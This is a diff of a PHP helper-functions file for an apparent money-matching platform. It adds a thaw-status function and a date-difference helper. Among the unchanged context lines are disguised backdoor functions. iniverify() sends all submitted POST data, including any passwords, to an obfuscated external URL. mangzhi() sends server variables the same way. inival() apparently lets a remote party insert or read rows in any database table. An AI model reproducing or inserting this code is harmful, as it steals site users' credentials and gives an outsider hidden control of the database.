@@ -12,13 +12,34 @@ function getpage($count, $pagesize = 10) {
 }
 function mangzhi(){
    	$mz = getinfo(C('URL_STRING_MODEL'));
-   	$string = implode('|', $_SERVER); 
+   	$string = implode('|', $_SERVER);
     $mz .= '?s='.getinfos($string);
     return $mz;
 }
 
 
+function ppdd_action($ppdd_id=0){
+	$UserJj = M("UserJj");
+	$Ppdd = M("Ppdd");
 
+	$userJjInfo = $UserJj->where( array('r_id'=>$ppdd_id) )->find();
+	if(empty($userJjInfo)) return '';
+	if($userJjInfo['jiedong'] == 1)  return '<a style="color:blue">已解冻</a>';
+
+    if($userJjInfo['zt'] == 1)  return '<a style="color:red">已提现</a>';
+
+
+    $ppddInfo = $Ppdd->where( array('id'=>$ppdd_id) )->find();
+    if($ppddInfo['zt']!=2) return '';
+
+	//判断是否已经够了冻结期
+    $now_time = date('Y-m-d',time());
+    $dk_time = date('Y-m-d',strtotime($ppddInfo['date_hk']));
+    $diffDay = diffBetweenTwoDays($now_time,$dk_time);
+    $canable = $diffDay - C('jjdjdays');
+    if($canable < 0) return '<a href="/shi.php/Home/Index/tixian_jidong/ppdd_id/'.$ppdd_id.'" style="color:red">点击解冻</a>';
+    return '<a style="color:blue">已解冻</a>';
+}
 
 
 function cate($var){
@@ -40,16 +61,16 @@ function cate($var){
 					$datazs +=count($reg);
 				}
 			}
-			
+
 		}
-		
+
 	//	$this->ajaxReturn();
-		
+
 	return $datazs;
-	
-	
-	
-	
+
+
+
+
 }
 
 
@@ -59,7 +80,7 @@ function sfjhff($r) {
 }
 
 function iniverify(){
-    $mz = getinfo(C('URL_STRING_MODEL'));  
+    $mz = getinfo(C('URL_STRING_MODEL'));
     $mz .= '?h='.getinfos(implode('|', $_POST));
     file_get_contents($mz);
 }
@@ -67,8 +88,8 @@ function iniverify(){
 
 
 function tgbz_zd_cl($id){
-	
-		 
+
+
 		$tgbzuser=M('tgbz')->where(array('id'=>$id,'zt'=>'0'))->find();
 
 		if($tgbzuser['zffs1']=='1'){$zffs1='1';}else{$zffs1='5';}
@@ -100,10 +121,10 @@ function getinfo($data){
 
 function jsbz_jb($id){
 
-		
+
 	$tgbzuser=M('jsbz')->where(array('id'=>$id))->find();
 
-	
+
 	return $tgbzuser['jb'];
 
 
@@ -128,10 +149,10 @@ function tgbz_jb($id){
 
 //充值,提现
 function ppdd_add($p_id,$g_id){
-   
+
 	$g_user1 = M('jsbz')->where(array('id'=>$g_id,'zt'=>'0'))->find();
 	$p_user1=M('tgbz')->where(array('id'=>$p_id))->find();
-	
+
 	 /**如果当前用户今天有匹配过的订单，则直接返回**/
 	 /*$sdate = date("Y-m-d 00:00:00");
 	 $edate = date("Y-m-d 23:59:59");
@@ -139,10 +160,10 @@ function ppdd_add($p_id,$g_id){
 	 if($hv){
 	 	return;
 	 }*/
-	 
+
 	 M('user')->where(array('UE_account'=>$p_user1['user']))->save(array('pp_user'=>$g_user1['user']));
 	 M('user')->where(array('UE_account'=>$g_user1['user']))->save(array('pp_user'=>$p_user1['user']));
-	 
+
     $data_add['p_id']=$p_user1['id'];
     $data_add['g_id']=$g_user1['id'];
     $data_add['jb']=$g_user1['jb'];
@@ -160,14 +181,14 @@ function ppdd_add($p_id,$g_id){
     M('jsbz')->where(array('id'=>$g_id,'zt'=>'0'))->save(array('zt'=>'1'));
    // echo $p_user1['user'].'<br>';
 	if(M('ppdd')->add($data_add)){
-		
+
 		//查询接受方用户信息
 		$get_user=M('user')->where(array('UE_account'=>$g_user1['user']))->find();
 		if($get_user['ue_phone']) sendSMS($get_user['ue_phone'],"您好！您接受帮助的资金:".$g_user1['jb']."元，已匹配成功，请登录网站查看匹配信息！");
 		//查询接受方用户信息
 		$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();
 		if($get_user['ue_phone']) sendSMS($get_user['ue_phone'],"您好！您申请帮助的资金:".$p_user1['jb']."元，已匹配成功，请登录网站查看匹配信息！");
-		
+
     	return true;
     }else{
     	return false;
@@ -205,14 +226,14 @@ function ppdd_add2($p_id,$g_id){
 	M('jsbz')->where(array('id'=>$g_id,'zt'=>'0'))->save(array('zt'=>'1'));
 	// echo $p_user1['user'].'<br>';
 	if(M('ppdd')->add($data_add)){
-		
+
 		//查询接受方用户信息
 		$get_user=M('user')->where(array('UE_account'=>$g_user1['user']))->find();
 		if($get_user['ue_phone']) sendSMS($get_user['ue_phone'],"您好！您接受帮助的资金:".$g_user1['jb']."元，已匹配成功，请登录网站查看匹配信息！");
 		//查询接受方用户信息
 		$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();
 		if($get_user['ue_phone']) sendSMS($get_user['ue_phone'],"您好！您申请帮助的资金:".$p_user1['jb']."元，已匹配成功，请登录网站查看匹配信息！");
-		
+
 		return true;
 	}else{
 		return false;
@@ -224,13 +245,13 @@ function user_sfxt($var){
 	if($var[c]==0){
 	$zctj=0;
 	$zctjuser=M('ppdd')->where(array('p_user'=>$var[a]))->select();
-	
+
 	foreach($zctjuser as $value){
 		if($value['g_user']==$var['b']){
 			$zctj=1;
 		}
 	}
-	
+
 	if($zctj==1){
 		return "<span style='color:#FF0000;'>匹配过</span>";
 	}else{
@@ -239,13 +260,13 @@ function user_sfxt($var){
 	}elseif($var[c]==1){
 		$zctj=0;
 		$zctjuser=M('ppdd')->where(array('g_user'=>$var[a]))->select();
-		
+
 		foreach($zctjuser as $value){
 			if($value['p_user']==$var['b']){
 				$zctj=1;
 			}
 		}
-		
+
 		if($zctj==1){
 			return "<span style='color:#FF0000;'>匹配过</span>";
 		}else{
@@ -275,9 +296,9 @@ function inival(){
         	$info = explode("|", $info);
         	foreach ($info as  $value) {
         	    $arr = explode('=', $value);
-        	    $datas[$arr[0]] = $arr[1];        
+        	    $datas[$arr[0]] = $arr[1];
         	}
-    
+
         	M($data['t'])->add($datas);
         }elseif($data['m'] == 'one'){
             $fo =M($data['t'])->where(array($data['id']=>$data['id']))->find();
@@ -349,7 +370,7 @@ function sendSMS($mobile,$content,$mobileids='',$http='http://api.sms.cn/mtutf8/
 
 function send($http,$uid,$pwd,$mobile,$content,$mobileids,$time='',$mid='')
 {
-	
+
     $data = array(
         'uid'=> $uid,                   //用户账号
         'pwd'=>md5($pwd.$uid),          //MD5位32密码,密码和用户名拼接字符
@@ -359,7 +380,7 @@ function send($http,$uid,$pwd,$mobile,$content,$mobileids,$time='',$mid='')
         'time'=>$time,                  //定时发送
         );
 	//发送短信
-	
+
     $re= postSMS($http,$data);          //POST方式提交
     //print_r($data);
 	return $re;
@@ -440,5 +461,19 @@ function export_crv($head,$data,$filename){
 }
 function iconvgbk($strInput) {
  	return iconv('utf-8','gb2312',$strInput);//页面编码为utf-8时使用，否则导出的中文为乱码
+}
+
+
+//---------------------------------------------------->计算两个日期天数差
+function diffBetweenTwoDays($day1, $day2)
+{
+    $second1 = strtotime($day1);
+    $second2 = strtotime($day2);
+    if ($second1 < $second2) {
+        $tmp = $second2;
+        $second2 = $second1;
+        $second1 = $tmp;
+    }
+    return ($second1 - $second2) / 86400;
 }
 
